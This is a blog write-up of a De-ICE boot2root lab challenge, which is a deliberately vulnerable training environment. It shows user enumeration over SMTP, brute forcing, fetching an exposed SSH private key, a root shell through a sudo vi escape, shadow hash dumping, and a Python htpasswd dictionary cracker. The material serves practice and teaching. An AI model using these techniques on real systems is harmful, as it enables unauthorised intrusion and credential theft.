---
layout: post
title: "De-ICE hacking challenge: Part 3"
date: 2011-08-01 18:10:26 -0400
comments: true
categories: boot2root hacking
alias: /2011/08/de-ice-hacking-challenge-part-3.html
---

This is a walkthrough on how I completed level 2 of the De-ICE penetration testing Live CDs. I had completed level 1 a week before and talked about my experiences in a two part post ([part 1](/2011/07/19/de-ice-hacking-challenge-part-1/) and [part 2](/2011/07/20/de-ice-hacking-challenge-part-2/)). If you're interested in learning some hacking in a safe environment, I recommend checking out [HackingDojo](http://hackingdojo.com/pentest-media/) and downloading the De-ICE Live CDs.

<!--more-->

Level 2 offers no hints on their page regarding the target server. The only bit of immediate information is on the target company website, which just lists employee names and email addresses:

->![](/images/2011-08-01/01.png)<-

I copied down the employee names and generated a list of possible login names that might be used on the server using a [script](/2011/07/17/creating-a-user-name-list-for-brute-force-attacks/) I wrote:

```
t.weller
w.tony
tony
weller
estellahavisham
havishamestella
estella.havisham
havisham.estella
havishame
ehavisham
hestella
e.havisham
h.estella
estella
havisham
abelmagwitch
magwitchabel
abel.magwitch
magwitch.abel
```

This resulted in over 200 possible combinations. I needed to narrow that list down if I wanted to do a brute force attack. I put it aside at the moment and did a port scan to determine what services were exposed:

```
root@syconium# nmap -sS -A -oN nmap.txt 192.168.2.100
Nmap scan report for 192.168.2.100
Host is up (0.00039s latency).
Not shown: 992 filtered ports
PORT    STATE  SERVICE  VERSION
20/tcp  closed ftp-data
21/tcp  open   ftp      vsftpd 2.0.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp  open   ssh      OpenSSH 4.3 (protocol 1.99)
|_sshv1: Server supports SSHv1
| ssh-hostkey: 2048 83:4f:8b:e9:ea:84:20:0d:3d:11:2b:f0:90:ca:79:1c (RSA1)
| 2048 6f:db:a5:12:68:cd:ad:a9:9c:cd:1e:7b:97:1a:4c:9f (DSA)
|_2048 ab:ab:a8:ad:a2:f2:fd:c2:6f:05:99:69:40:54:ec:10 (RSA)
25/tcp  open   smtp     Sendmail 8.13.7/8.13.7
| smtp-commands: slax.example.net Hello [192.168.2.128], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, 8BITMIME, SIZE, DSN, ETRN, AUTH DIGEST-MD5 CRAM-MD5, DELIVERBY, HELP
|_ 2.0.0 This is sendmail version 8.13.7 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation see 2.0.0 http://www.sendmail.org/email-addresses.html 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info
80/tcp  open   http     Apache httpd 2.0.55 ((Unix) PHP/5.1.2)
|_html-title: Site doesn't have a title (text/html).
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
110/tcp open   pop3     Openwall popa3d
|_pop3-capabilities: capa
143/tcp open   imap     UW imapd 2004.357
|_imap-capabilities: BINARY THREAD=ORDEREDSUBJECT IMAP4REV1 STARTTLS LOGIN-REFERRALS UNSELECT SCAN SASL-IR THREAD=REFERENCES MAILBOX-REFERRALS SORT AUTH=LOGIN LITERAL+ IDLE NAMESPACE MULTIAPPEND
443/tcp closed https
MAC Address: 00:0C:29:94:D5:FA (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS details: Linux 2.6.13 - 2.6.31
Network Distance: 1 hop
Service Info: Host: slax.example.net; OS: Unix
 
TRACEROUTE
HOP RTT     ADDRESS
1   0.39 ms 192.168.2.100
 
OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
# Nmap done at Sat Jul 23 10:25:53 2011 -- 1 IP address (1 host up) scanned in 13.79 seconds
```

SMTP was open, I wondered if I could use that to determine valid user accounts. I fired up metasploit and ran smtp_enum against the target. I got lucky and it confirmed three valid accounts:

```
auxiliary(smtp_enum) > run
 
[*] 220 slax.example.net ESMTP Sendmail 8.13.7/8.13.7; Sat, 23 Jul 2011 10:32:18 GMT
 
[*] Domain Name: example.net
[+] 192.168.2.100:25 - Found user: havisham
[+] 192.168.2.100:25 - Found user: magwitch
[+] 192.168.2.100:25 - Found user: pirrip
[-] 192.168.2.100:25 - EXPN : 502 5.7.0 Sorry, we do not allow this operation
[+] 192.168.2.100:25 Users found: havisham, magwitch, pirrip
[*] 192.168.2.100:25 No e-mail addresses found.
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

I created a new list of login names with those valid names and fired up hydra against the target. I exhausted a couple of large wordlists and gave up on this venue of attack. Whatever their passwords were, they weren't in any of my wordlists.

The next thing I decided to do was to see if there was anything else residing on their web server. I was looking for any interesting directories or files that weren't linked from the main page. I used nikto and dirbuster for this. Both of them reported similar outputs, but nikto in particular discovered that info.php was exposed:

```
root@syconium# cd /pentest/web/nikto
root@syconium# ./nikto.pl -config nikto.conf -host 192.168.2.100
- Nikto v2.1.4
---------------------------------------------------------------------------
+ Target IP:          192.168.2.100
+ Target Hostname:    192.168.2.100
+ Target Port:        80
+ Start Time:         2011-07-23 11:27:19
---------------------------------------------------------------------------
+ Server: Apache/2.0.55 (Unix) PHP/5.1.2
+ Retrieved x-powered-by header: PHP/5.1.2
+ PHP/5.1.2 appears to be outdated (current is at least 5.3.5)
+ Apache/2.0.55 appears to be outdated (current is at least Apache/2.2.17). Apache 1.3.42 (final release) and 2.0.64 are also current.
 
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE 
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-12184: /index.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-3233: /info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ OSVDB-5292: /info.php?file=http://cirt.net/rfiinc.txt?: RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/
+ 6448 items checked: 2 error(s) and 11 item(s) reported on remote host
+ End Time:           2011-07-29 11:28:10 (51 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

info.php contained a lot of information including services running in the background. This version of Apache and PHP were vulnerable to several XSS exploits, but were of no use to me in terms of rooting the server. 

I tried connecting to the FTP server but it was broken and would keep disconnecting me. I also looked into the open IMAP service but that proved fruitless. At this point I felt that I had hit a brick wall and took a break.

A couple of days later, it occurred to me that maybe the server was configured to periodically send out data, maybe to simulate a user accessing a webpage or something. I thought if I listened in on the network, maybe I'd see something. I started by running netdiscover to see if anything else was broadcasting on the network. To my surprise, there was a second IP address, 192.168.2.101!

```
Currently scanning: 192.168.25.0/16   |   Screen View: Unique Hosts                                                                           
                                                                                                                                                
 5 Captured ARP Req/Rep packets, from 5 hosts.   Total size: 300                                                                               
 _____________________________________________________________________________
   IP            At MAC Address      Count  Len   MAC Vendor                   
 ----------------------------------------------------------------------------- 
 192.168.2.1     00:50:56:c0:00:08    01    060   VMWare, Inc.                                                                                 
 192.168.2.2     00:50:56:ee:cf:20    01    060   VMWare, Inc.                                                                                 
 192.168.2.100   00:0c:29:94:d5:fa    01    060   VMware, Inc.                                                                                 
 192.168.2.101   00:0c:29:94:d5:fa    01    060   VMware, Inc.                                                                                 
 192.168.2.254   00:50:56:e6:02:53    01    060   VMWare, Inc.
```

I foolishly assumed that there was only one target in the challenge! A quick nmap revealed that this target was only running HTTP. I checked out the website and found several PDFs linked on the main page:

->![](/images/2011-08-01/02.png)<-

I downloaded the PDFs but didn't find anything of interest. There were no other visible links or directories, so I decided to try nikto and dirbuster to see if anything would show up. Sure enough, dirbuster reported a /home directory:

->![](/images/2011-08-01/03.png)<- 

I tried going to http://192.168.2.101/home/root and found that it was viewable. I did the same for the three known user accounts, but they were all empty. I decided to look for hidden files that might be useful: .bashrc, .bash_profile and .ssh. I got lucky and found that pirrip had a viewable .ssh directory!

->![](/images/2011-08-01/04.png)<-

Not only was it viewable, it contained the private and public SSH keys for pirrip. If the private key wasn't password protected, and pirrip used it to log into 192.168.2.100, then I might be able to do the same. I downloaded id_rsa and copied it to my ~/.ssh directory and changed the permissions to read/write only by root, crossed my fingers and tried to SSH to the server:

```
root@syconium# cd ~/.ssh
root@syconium# wget -q  http://192.168.2.101/home/pirrip/.ssh/id_rsa
root@syconium# chmod 600 id_rsa
root@syconium# ssh pirrip@192.168.2.101
Linux 2.6.16.
pirrip@slax:~$ id
uid=1000(pirrip) gid=10(wheel) groups=10(wheel)
pirrip@slax:~$
```

Success, but there was more to be done. I was in the server, but I needed to get root access. I tried to run sudo but it prompted me for a password, which I didn't have. It was time to do some exploring. 

I was limited in what I could read, so I went through pirrip's home directory, web folders, log files, and so on. Eventually I made my way to /var/mail/pirrip. I opened this up and read through pirrip's emails and right at the bottom, found pirrip's password:

```
From: noreply@fermion.herot.net
Message-Id: <200801132354.m0DNshjD011722@slax.example.net>
Date: Sun, 13 Jan 2008 23:54:42 +0000
To: pirrip@slax.example.net
Subject: Fermion Account Login Reminder
User-Agent: nail 11.25 7/29/05
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
 
Fermion Account Login Reminder
 
Listed below are your Fermion Account login credentials.  Please let us know if you have any questions or problems.
 
Regards,
Fermion Support
 
 
E-Mail: pirrip@slax.example.net
Password: 0l1v3rTw1st
```

Using this new bit of information, I tried sudo again and it accepted the password and presented me with a list of programs I could use with sudo:

```
pirrip@slax:~$ sudo -l
 
We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:
 
    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.
 
Password:
User pirrip may run the following commands on this host:
    (root) /usr/bin/more
    (root) /usr/bin/tail
    (root) /usr/bin/vi
    (root) /usr/bin/cat ALL
```

vi is allowed, so I used it to open /etc/shadow to obtain the encrypted passwords for later cracking. Another neat feature of vi is it's ability to run commands by typing !command while you're viewing a file. So I entered !/bin/bash and was dropped into a root shell:

```
rpc:*:9797:0:::::
sshd:*:9797:0:::::
gdm:*:9797:0:::::
pop:*:9797:0:::::
nobody:*:9797:0:::::
pirrip:$1$KEj04HbT$ZTn.iEtQHcLQc6MjrG/Ig/:13882:0:99999:7:::
magwitch:$1$qG7/dIbT$HtTD946DE3ITkbrCINQvJ0:13882:0:99999:7:::
!/bin/bash
bash-3.1# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy)
bash-3.1#
```

The server has been successfully rooted. I knew from the previous two challenges that rooting the server wasn't enough. There would be some hidden file with confidential information hidden away somewhere, so I started searching for it. 

I found a file called /root/.save/great_expectations.zip. I tried to unzip it but the server complained that the disk was full, so I transferred it over to /var/www/htdocs and downloaded it to my machine. After extracting and pouring over the contents of the zip file, one in particular stood out. A file called Jan08 contained the pay raise information and social security numbers for pirrip, havisham, and magwitch:

```
root@syconium# cat Jan08 
--snip--
To: pirrip@slax.example.net
Subject: Raises
User-Agent: nail 11.25 7/29/05
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
 
Here's the data for raises for your team:
Philip Pirrip:  734-67-0424 5.5% $74,224
Abel Magwitch:  816-03-0028 4.0% $53,122
Estella Havisham: 762-93-1073 12% $84,325
```

Mission accomplished, but I didn't stop there. MySQL was running on the server and I wanted to see if there was any interesting data on it. I tried logging in without passwords as havisham, magwitch, and pirrip and it let me in. Nothing to see there though. I tried using root but it wanted a password. I tried guessing the password as root and toor, and got in with password toor. Unfortunately, no interesting data was stored. 

I found a /usr/local/apache/.htpasswd file with the following contents:

```
bash-3.1# cat /usr/local/apache2/.htpasswd 
aadams:bS.PQ9hVYEqrQ
```

Looks like the password was encrypted with crypt(). The first two characters in the ciphertext is the salt. Knowing this, I wrote a quick python script to try a dictionary attack on the password:

```python
#!/usr/bin/env python
import crypt, sys
 
if __name__ == "__main__":
    wordlist = sys.argv[1]
    htfile = sys.argv[2]
    print "using wordlist:", wordlist
    print "using htaccess:", htfile
 
    for line in open(htfile):
        user = line.split(":")[0].strip()
        ciphertext = line.split(":")[1].strip()
        salt = ciphertext[:2]
        print "ciphertext:", ciphertext
        print "salt:", salt
        for word in open(wordlist):
            guess = crypt.crypt(word.strip(), salt)
            if guess == ciphertext:
                print "  *  password for %s is %s" % (user, word.strip())
                sys.exit(0)
```

The script takes two arguments. The first is the wordlist, and the second is the htpasswd file:

```text
root@syconium# crackht /pentest/passwords/wordlists/darkc0de.lst htpasswd 
using wordlist: /pentest/passwords/wordlists/darkc0de.lst
using htpasswd: htpasswd
ciphertext: bS.PQ9hVYEqrQ
salt: bS
  *  password for aadams is complexi
```

I was able to get the password for aadams. Not really usable at this point, but a nice bonus in any case.

This challenge was a lot of fun and took me several hours over the course of about a week to complete. The website states that it takes approximately 40 hours to complete the challenge. I probably hit close to 30 hours, and would have probably done it in less had I known there was a second web server in the challenge. Once I discovered the second web server, I blew through the rest of the challenge in a breeze.

That's it for the De-ICE hacking challenge. I recommend giving it a go if you're interested in getting your feet wet in penetration testing. 

